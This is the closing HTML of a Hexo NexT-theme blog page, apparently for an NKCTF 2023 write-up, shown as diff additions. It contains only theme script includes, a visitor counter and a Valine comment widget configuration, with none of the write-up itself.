+  <a href="https://github.com/liu1272" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/comments.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/motion.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/sidebar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/next-boot.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/bookmark.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/search/local-search.min.js"></script>
+
+  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.3.0/pdfobject.min.js","integrity":"sha256-JJZNsid68vnh3/zyj0lY9BN5ynxVX/12XgOa1TlaYN0="},"url":"/lib/pdf/web/viewer.html"}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/tags/pdf.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/fancybox.min.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+<script class="next-config" data-name="valine" type="application/json">{"enable":true,"appId":"Saj0Y9foXlqnIK4Ing0paYci-MdYXbMMI","appKey":"eSefitZxNdI9H6p6lkyRYI5g","serverURLs":"https://saj0y9fo.api.lncldglobal.com","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":true,"enableQQ":true,"requiredFields":[],"el":"#valine-comments","path":"/2023/03/27/NKCTF2023WP/"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.valine.el)
+    .then(() => NexT.utils.getScript(
+      'https://fastly.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+      { condition: window.Valine }
+    ))
+    .then(() => {
+      new Valine(CONFIG.valine);
+    });
+});
+</script>
+
+
+</body>
+</html>
